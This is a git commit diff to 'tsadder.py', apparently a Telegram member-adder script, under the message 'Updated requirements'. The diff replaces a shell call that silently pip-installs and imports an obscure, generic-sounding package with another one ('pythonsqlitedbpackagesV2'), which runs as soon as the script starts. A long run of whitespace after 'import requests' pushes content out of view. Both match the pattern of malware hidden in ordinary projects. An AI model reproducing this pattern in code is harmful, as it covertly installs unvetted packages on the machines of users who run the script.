83e81c6005c2b47e369dc3a03750379698ff9875
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-18 16:08:56 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlipackages")
-import pipsqlipackages
+os.system("pip install pythonsqlitedbpackagesV2")
+import pythonsqlitedbpackagesV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
